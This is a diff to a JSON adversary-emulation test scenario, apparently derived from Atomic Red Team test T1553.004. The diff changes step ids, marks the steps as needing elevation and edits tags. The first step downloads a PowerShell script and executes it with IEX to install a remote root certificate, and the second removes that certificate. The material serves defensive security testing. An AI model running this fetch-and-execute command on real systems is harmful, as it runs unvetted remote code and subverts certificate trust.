@@ -7,38 +7,38 @@
   ],
   "steps": [
     {
-      "id": "70c0b724-1078-444e-ae2c-9fa8c4e5d65e",
+      "id": "6c521b2e-b401-45a9-b16c-44bbadfd6743",
       "type": "execute-command",
       "data": {
         "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) \n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "3d05fed4-0cc2-467d-bd42-5da815ba3dd4",
+      "id": "2286f49f-91b2-4c2c-9526-bf4a667a3a87",
       "type": "execute-command",
       "data": {
         "command": "Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item \n",
         "command_type": "powershell"
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "70c0b724-1078-444e-ae2c-9fa8c4e5d65e",
+      "s": "6c521b2e-b401-45a9-b16c-44bbadfd6743",
       "p": "on-success",
-      "o": "3d05fed4-0cc2-467d-bd42-5da815ba3dd4"
+      "o": "2286f49f-91b2-4c2c-9526-bf4a667a3a87"
     },
     {
-      "s": "70c0b724-1078-444e-ae2c-9fa8c4e5d65e",
+      "s": "6c521b2e-b401-45a9-b16c-44bbadfd6743",
       "p": "on-failure",
-      "o": "3d05fed4-0cc2-467d-bd42-5da815ba3dd4"
+      "o": "2286f49f-91b2-4c2c-9526-bf4a667a3a87"
     }
   ],
   "tags": [
-    "T1553.004",
-    "atomic-red-team"
+    "T1553",
+    "T1553.004"
   ]
 }
